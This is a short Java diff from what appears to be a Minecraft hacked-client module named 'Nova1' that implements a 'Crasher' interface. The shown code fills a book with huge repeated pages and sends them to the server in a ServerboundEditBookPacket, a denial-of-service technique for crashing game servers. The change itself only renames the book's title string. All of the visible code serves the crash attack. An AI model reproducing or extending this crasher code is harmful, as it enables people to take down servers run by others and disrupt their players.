@@ -35,7 +35,7 @@ public class Nova1 implements Crasher {
             for (int j = 0; j <= pagesAmount; j++) {
                 pages.add(content.repeat(size));
             }
-            PacketHelper.send(new ServerboundEditBookPacket(-1, pages, Optional.of("xynis")));
+            PacketHelper.send(new ServerboundEditBookPacket(-1, pages, Optional.of("redsignal")));
         }
 
         setEnabled(false);
